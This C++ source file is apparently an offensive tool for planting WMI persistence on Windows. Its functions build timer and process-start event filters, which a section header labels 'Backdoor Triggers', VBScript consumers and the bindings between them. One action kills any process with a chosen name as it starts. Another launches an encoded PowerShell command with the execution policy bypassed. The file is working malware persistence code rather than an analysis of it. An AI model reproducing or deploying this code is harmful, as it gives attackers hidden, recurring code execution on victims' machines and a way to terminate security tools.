#include <Windows.h>
#include <Wbemidl.h>
#include <comutil.h>

#include "../config.h"

/****************************************************************************
 * timer instance configure functions (Backdoor Triggers)
 */

HRESULT interval_timer(IWbemClassObject *timer, wchar_t *timerid, wchar_t *event_namespace)
{
	HRESULT hres = S_OK;
	VARIANT v;
	wchar_t *timeid = NULL;

	//input validation
	if(!timer)
		return S_FALSE;

	if(timerid)
		timeid = timerid;
	else
		timeid = DEFAULT_TIMERNAME;

	VariantInit(&v);

	//TimerId property
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(timerid);
	hres = timer->Put(_bstr_t(L"TimerId"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set TimerId property 0x%x\n", hres);
		goto cleanup;
	}
	VariantClear(&v);

	//IntervalBetweenEvents property
	V_VT(&v) = VT_I4;
	V_I4(&v) = 60000;
	hres = timer->Put(_bstr_t(L"IntervalBetweenEvents"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set IntervalBetweenEvents property 0x%x\n", hres);
		goto cleanup;
	}

cleanup:
	VariantClear(&v);

	return hres;
}

HRESULT absolute_timer(IWbemClassObject *timer, wchar_t *timerid, wchar_t *event_namespace)
{
	HRESULT hres = S_OK;

	//TODO implement this

	return hres;
}

/****************************************************************************
 * __EventFilter instance configure functions (Triggers)
 */

HRESULT generic_trigger(IWbemClassObject *event_filter, wchar_t *trigger_name, wchar_t *query, wchar_t *event_namespace)
{
	HRESULT hres = S_OK;
	VARIANT v;
	wchar_t *name, *event_nmspace;

	//input validation
	if(!event_filter || !query)
		return S_FALSE;

	if(trigger_name)
		name = trigger_name;
	else
		name = DEFAULT_EVENTFILTER_NAME;

	if(event_namespace)
		event_nmspace = event_namespace;
	else
		event_nmspace = DEFAULT_NAMESPACE;

	VariantInit(&v);

	//name property
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(name);
	hres = event_filter->Put(_bstr_t(L"Name"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set Name property 0x%x\n", hres);
		goto cleanup;
	}
	VariantClear(&v);

	//query property
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(query);
	hres = event_filter->Put(_bstr_t(L"Query"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set Query property 0x%x\n", hres);
		goto cleanup;
	}
	VariantClear(&v);

	//querylanguage property
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(L"WQL");
	hres = event_filter->Put(_bstr_t(L"QueryLanguage"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set QueryLanguage property 0x%x\n", hres);
		goto cleanup;
	}
	VariantClear(&v);

	//eventnamespace property
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(event_nmspace);
	hres = event_filter->Put(_bstr_t(L"EventNamespace"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set EventNamespace property 0x%x\n", hres);
		goto cleanup;
	}

cleanup:
	VariantClear(&v);

	return hres;
}

HRESULT process_start_trigger(IWbemClassObject *event_filter, wchar_t *trigger_name, wchar_t *proc_name, wchar_t *event_namespace)
{
	HRESULT hres = S_OK;
	wchar_t query[WBEM_MAX_QUERY];

	if(!event_filter || !proc_name)
		return S_FALSE;

	swprintf_s(query, (size_t)WBEM_MAX_QUERY, L"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = '%s'", proc_name);
	hres = generic_trigger(event_filter, trigger_name, query, event_namespace);
	if(FAILED(hres)) {
		printf("[-] process_start_trigger failed 0x%x\n", hres);
		return hres;
	}

	return hres;
}

HRESULT timing_trigger(IWbemClassObject *event_filter, wchar_t *trigger_name, wchar_t *event_namespace, wchar_t *timer_name)
{
	HRESULT hres = S_OK;
	wchar_t query[WBEM_MAX_QUERY];

	if(!event_filter || !timer_name)
		return S_FALSE;

	swprintf_s(query, (size_t)WBEM_MAX_QUERY, L"SELECT * FROM __TimerEvent WHERE TimerID = '%s'", timer_name);
	hres = generic_trigger(event_filter, trigger_name, query, event_namespace);
	if(FAILED(hres)) {
		printf("[-] process_start_trigger failed 0x%x\n", hres);
		return hres;
	}

	return hres;
}

/****************************************************************************
 * Event consumer instance configure functions (Actions)
 */

HRESULT generic_action(IWbemClassObject *event_consumer, wchar_t *action_name, wchar_t *script)
{
	HRESULT hres = S_OK;
	VARIANT v;
	wchar_t *act_name = NULL;

	if(!event_consumer)
		return S_FALSE;

	if(action_name)
		act_name = action_name;
	else
		act_name = DEFAULT_EVENTCONSUMER_NAME;

	VariantInit(&v);

	//name property
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(act_name);
	hres = event_consumer->Put(_bstr_t(L"Name"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set Name property 0x%x\n", hres);
		goto cleanup;
	}
	VariantClear(&v);

	//ScriptText property
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(script);
	hres = event_consumer->Put(_bstr_t(L"ScriptText"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set ScriptText property 0x%x\n", hres);
		goto cleanup;
	}
	VariantClear(&v);

	//ScriptingEngine property
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(L"VBScript");
	hres = event_consumer->Put(_bstr_t(L"ScriptingEngine"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set ScriptingEngine property 0x%x\n", hres);
		goto cleanup;
	}
	VariantClear(&v);

	//KillTimeout property
	V_VT(&v) = VT_I4;
	V_I4(&v) = 45;
	hres = event_consumer->Put(_bstr_t(L"KillTimeout"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set KillTimeout property 0x%x\n", hres);
		goto cleanup;
	}

cleanup:
	VariantClear(&v);

	return hres;
}

HRESULT process_kill_action(IWbemClassObject *event_consumer, wchar_t *action_name)
{
	HRESULT hres = S_OK;
	wchar_t *script = L"\
Dim oLocation, oServices, oProcessList, oProcess\n\
Set oLocation = CreateObject(\"WbemScripting.SWbemLocator\")\n\
Set oServices = oLocation.ConnectServer(, \"root\\cimv2\")\n\
Set oProcessList = oServices.ExecQuery(\"SELECT * FROM Win32_Process WHERE ProcessID = \" & TargetEvent.ProcessID)\n\
For Each oProcess in oProcessList\n\
oProcess.Terminate()\n\
Next";
//	wchar_t *script = L"\
//Dim fso, MyFile\n\
//Set fso = CreateObject(\"Scripting.FileSystemObject\")\n\
//Set MyFile = fso.CreateTextFile(\"c:\\users\\someuser\\test.txt\", True)\n\
//MyFile.WriteLine(\"This is a test.\")\n\
//MyFile.Close";

	hres = generic_action(event_consumer, action_name, script);

	return hres;
}

HRESULT enc_powershell_action(IWbemClassObject *event_consumer, wchar_t *action_name, wchar_t *enc_cmd)
{
	HRESULT hres = S_OK;
	wchar_t *script_start = L"\
Dim oShell\n\
Set oShell = CreateObject(\"WScript.Shell\")\n\
oShell.Run(\"powershell.exe -executionpolicy bypass -encodedcommand ";
	const size_t MAX_SCRIPT_LENGTH = 4096; //arbitrary
	wchar_t script[MAX_SCRIPT_LENGTH];

	memset(script, 0, sizeof(script));
	swprintf_s(script, MAX_SCRIPT_LENGTH, L"%s%s\")\n", script_start, enc_cmd);

	hres = generic_action(event_consumer, action_name, script);

	return hres;
}

/****************************************************************************
 * Event_consumer_binding instance configure functions (Bindings)
 */

HRESULT generic_binding(IWbemClassObject *binding, wchar_t *consumer_type, wchar_t *consumr_name, wchar_t *filtr_name)
{
	HRESULT hres = S_OK;
	VARIANT v;
	wchar_t consumer_name[WBEM_MAX_PATH], filter_name[WBEM_MAX_PATH];

	VariantInit(&v);
	
	swprintf_s(consumer_name, (size_t)WBEM_MAX_PATH, L"%s.Name=\"%s\"", consumer_type, consumr_name);
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(consumer_name);
	hres = binding->Put(_bstr_t(L"Consumer"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set Consumer property 0x%x\n", hres);
		goto cleanup;
	}
	VariantClear(&v);

	swprintf_s(filter_name, (size_t)WBEM_MAX_PATH, L"%s\"%s\"", L"__EventFilter.Name=", filtr_name);
	V_VT(&v) = VT_BSTR;
	V_BSTR(&v) = SysAllocString(filter_name);
	hres = binding->Put(_bstr_t(L"Filter"), 0, &v, 0);
	if(FAILED(hres)) {
		printf("[-] failed to set Consumer property 0x%x\n", hres);
		goto cleanup;
	}

cleanup:
	VariantClear(&v);

	return hres;
}